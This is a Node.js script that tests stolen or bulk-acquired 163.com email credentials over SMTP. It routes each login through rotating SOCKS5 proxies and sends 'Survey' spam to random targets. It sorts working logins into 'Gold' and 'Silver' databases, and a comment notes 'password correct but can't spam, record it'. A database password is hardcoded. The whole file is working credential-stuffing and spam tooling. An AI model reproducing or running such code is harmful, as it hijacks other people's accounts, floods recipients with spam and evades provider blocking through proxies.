const nodemailer = require('nodemailer')
const targets = require('../target/target')
const accounts = require('../account/163ab')
const fs = require('fs')
const mongoose = require('mongoose')
const GoodProxy = require('../common/schemas/goodProxySchema')
const Gold = require('../common/schemas/goldSchema')
const Silver = require('../common/schemas/silverSchema')
mongoose.connect('mongodb://yelexin:secretvalley@localhost/proxy')
async function go() {

  // search in 163 accounts
  for (let j = 0; j < 100000; j++) {
    console.log('round', j)
    let proxies = await GoodProxy.find({$and:[{protocol: 'socks5'},{stable:true}]})
    let res = null

    let r2 = Math.floor(Math.random() * (proxies.length))

    let transporter = nodemailer.createTransport({
      host: 'smtp.163.com',
      port: 465,
      secure: true, // true for 465, false for other ports
      auth: {
        user: accounts[j].email,
        pass: accounts[j].password
      },
      socketTimeout: 10000,
      connectionTimeout: 10000,
      greetingTimeout: 10000,
      proxy: 'socks5://' + proxies[r2].socket
    })
    transporter.set('proxy_socks_module', require('socks'))

    let r = Math.floor(Math.random() * 10000)

    let mailOptions = {
      from: `"Survey" <${accounts[j].email}>`, // sender address
      to: targets[r], // list of receivers
      subject: require('./content')().uglySubject, // Subject line
      text: require('./content')().uglyText,
      html: require('./content')().uglyHtml
    }

    try {
      res = await transporter.sendMail(mailOptions)
      console.log('success', accounts[j])
      await Gold.create({
        email: accounts[j].email,
        password: accounts[j].password
      })
    } catch (e) {
      if (!e.command) {
        j--
        console.log(e)
      } else {
        console.log(e.command)

      }
      if (e.command === 'DATA') {
        console.log(accounts[j])
        // password correct but can't spam, record it
        await Silver.create({
          email: accounts[j].email,
          password: accounts[j].password
        })
      }
      if (e.command === 'CONN') {
        j--
        console.log(e)
      }
      if (e.message.indexOf('Connection timeout') >= 0) {
        console.log('proxy wrong: '+proxies[r2].socket)
        await GoodProxy.update({socket: proxies[r2].socket},{$set:{stable: false}})
      }
      if (e.message.indexOf('Greeting never received') >= 0) {
        console.log('proxy wrong: '+proxies[r2].socket)
        // await GoodProxy.update({socket: proxies[r2].socket},{$set:{stable: false}})
      }
      if (e.message.indexOf('Received invalid Socks5 initial handshake') >= 0) {
        console.log('proxy wrong: '+proxies[r2].socket)
        await GoodProxy.update({socket: proxies[r2].socket},{$set:{stable: false}})
      }

    }
  }
  console.log('miner finished')
}
go()
